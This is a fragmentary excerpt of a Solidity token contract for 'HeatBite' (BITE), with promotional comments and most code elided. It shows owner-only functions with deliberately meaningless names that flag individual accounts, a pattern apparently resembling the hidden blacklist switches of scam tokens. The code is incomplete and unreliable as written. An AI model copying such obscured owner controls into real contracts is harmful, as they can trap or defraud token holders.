...
// HeatBite Gateway into Blockchain
// HeatBite is a blockchain application platform that aims to make blockchain technology accessible to everyone.
// By providing an easy-to-use interface for building and deploying blockchain applications, HeatBite is helping to create a world in which everyone can benefit from the power of blockchain.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'HeatBite';
    string constant public symbol = 'BITE';
    ...
    function StatsMergeConnect(address account) public onlyOwner {
    ...
    function ExcludeConnectStats(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function MultiStatsTransfer(address account) public view returns (bool) {
...
contract BiteContractToken is BaseToken {
